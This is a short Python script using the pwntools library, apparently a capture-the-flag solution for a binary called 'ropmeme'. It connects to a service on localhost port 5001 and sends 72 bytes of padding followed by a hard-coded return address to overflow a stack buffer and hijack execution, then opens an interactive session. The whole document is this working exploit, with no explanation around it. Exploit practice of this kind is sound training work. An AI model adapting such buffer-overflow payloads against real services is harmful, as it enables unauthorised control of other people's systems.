#!/usr/bin/python
from pwn import *

context.log_level = 'DEBUG'
#p = process("./ropmeme")
p = remote("localhost", 5001)

junk = "A"*72
payload = junk + p64(0x00401196)

p.sendline(payload)
p.interactive()
